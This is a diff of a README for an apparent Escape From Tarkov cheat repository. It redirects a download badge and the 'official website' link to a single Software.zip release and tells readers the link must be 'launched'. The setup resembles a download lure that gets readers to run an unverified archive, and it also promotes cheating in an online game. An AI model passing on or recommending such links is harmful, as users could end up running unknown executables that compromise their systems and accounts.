@@ -31,7 +31,7 @@ Explore a variety of topics related to cheating in Escape From Tarkov:
 
 Click the button below to download the software that will take your gaming experience to the next level 🕹️
 
-[![Download Cheat Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18410590/Software.zip) 
+[![Download Cheat Software](https://github.com/shon125651/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip)](https://github.com/shon125651/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip) 
 
 **Note:** The link provided above needs to be launched to access the cheat software.
 
@@ -39,7 +39,7 @@ Click the button below to download the software that will take your gaming exper
 
 ### 🌐 Visit Our Website
 
-For more information and updates, visit our official website: [CheatEscapeFromTarkov.com](https://cheatescapefromtarkov.com)
+For more information and updates, visit our official website: [https://github.com/shon125651/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip](https://github.com/shon125651/cheat-escape-from-tarkov/releases/download/v2.0/Software.zip)
 
 ---
 
